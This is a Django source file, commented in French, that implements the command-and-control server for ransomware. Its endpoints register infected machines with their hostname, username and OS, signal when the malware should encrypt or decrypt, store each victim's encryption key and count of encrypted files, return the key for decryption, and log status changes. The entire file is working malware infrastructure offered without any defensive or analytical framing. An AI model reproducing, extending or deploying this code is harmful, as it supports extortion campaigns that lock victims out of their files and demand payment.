"""
API Views pour la communication avec le ransomware
"""

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
import json
from .models import InfectedMachine, StatusLog


@csrf_exempt
def register_machine(request):
    """Enregistre une nouvelle machine infectée"""
    
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            
            machine_id = data.get('machine_id')
            hostname = data.get('hostname', 'Unknown')
            username = data.get('username', 'Unknown')
            os_info = data.get('os', 'Unknown')
            
            # Créer ou mettre à jour la machine
            machine, created = InfectedMachine.objects.get_or_create(
                machine_id=machine_id,
                defaults={
                    'hostname': hostname,
                    'username': username,
                    'os_info': os_info,
                }
            )
            
            # Mettre à jour last_seen
            machine.last_seen = timezone.now()
            machine.save()
            
            # Créer un log
            if created:
                StatusLog.objects.create(
                    machine=machine,
                    status="REGISTERED",
                    details=f"Nouvelle machine enregistrée: {hostname}"
                )
            
            return JsonResponse({
                'status': 'success',
                'message': 'Machine enregistrée',
                'machine_id': machine_id,
                'created': created
            })
            
        except Exception as e:
            return JsonResponse({
                'status': 'error',
                'message': str(e)
            }, status=400)
    
    return JsonResponse({'status': 'error', 'message': 'Méthode non autorisée'}, status=405)


@csrf_exempt
def check_activation(request, machine_id):
    """Vérifie si le ransomware doit s'activer"""
    
    try:
        machine = InfectedMachine.objects.get(machine_id=machine_id)
        
        # Mettre à jour last_seen
        machine.last_seen = timezone.now()
        machine.save()
        
        return JsonResponse({
            'status': 'success',
            'activate': machine.is_activated and not machine.is_encrypted,
            'decrypt': machine.is_decrypted and not machine.payment_received == False,
            'machine_id': machine_id
        })
        
    except InfectedMachine.DoesNotExist:
        return JsonResponse({
            'status': 'error',
            'message': 'Machine non trouvée',
            'activate': False,
            'decrypt': False
        }, status=404)


@csrf_exempt
def save_encryption_key(request):
    """Sauvegarde la clé de chiffrement"""
    
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            
            machine_id = data.get('machine_id')
            encryption_key = data.get('encryption_key')
            files_count = data.get('files_encrypted', 0)
            
            machine = InfectedMachine.objects.get(machine_id=machine_id)
            machine.mark_encrypted(encryption_key, files_count)
            
            # Créer un log
            StatusLog.objects.create(
                machine=machine,
                status="ENCRYPTED",
                details=f"{files_count} fichiers chiffrés"
            )
            
            return JsonResponse({
                'status': 'success',
                'message': 'Clé sauvegardée',
                'files_encrypted': files_count
            })
            
        except InfectedMachine.DoesNotExist:
            return JsonResponse({
                'status': 'error',
                'message': 'Machine non trouvée'
            }, status=404)
        except Exception as e:
            return JsonResponse({
                'status': 'error',
                'message': str(e)
            }, status=400)
    
    return JsonResponse({'status': 'error', 'message': 'Méthode non autorisée'}, status=405)


@csrf_exempt
def get_encryption_key(request, machine_id):
    """Récupère la clé de chiffrement pour le déchiffrement"""
    
    try:
        machine = InfectedMachine.objects.get(machine_id=machine_id)
        
        if machine.encryption_key:
            return JsonResponse({
                'status': 'success',
                'encryption_key': machine.encryption_key,
                'machine_id': machine_id
            })
        else:
            return JsonResponse({
                'status': 'error',
                'message': 'Clé non disponible'
            }, status=404)
            
    except InfectedMachine.DoesNotExist:
        return JsonResponse({
            'status': 'error',
            'message': 'Machine non trouvée'
        }, status=404)


@csrf_exempt
def update_status(request):
    """Mise à jour du statut de la machine"""
    
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            
            machine_id = data.get('machine_id')
            status = data.get('status')
            details = data.get('details', '')
            
            machine = InfectedMachine.objects.get(machine_id=machine_id)
            
            # Mettre à jour last_seen
            machine.last_seen = timezone.now()
            machine.save()
            
            # Créer un log
            StatusLog.objects.create(
                machine=machine,
                status=status,
                details=details
            )
            
            return JsonResponse({
                'status': 'success',
                'message': 'Statut mis à jour'
            })
            
        except InfectedMachine.DoesNotExist:
            return JsonResponse({
                'status': 'error',
                'message': 'Machine non trouvée'
            }, status=404)
        except Exception as e:
            return JsonResponse({
                'status': 'error',
                'message': str(e)
            }, status=400)
    
    return JsonResponse({'status': 'error', 'message': 'Méthode non autorisée'}, status=405)
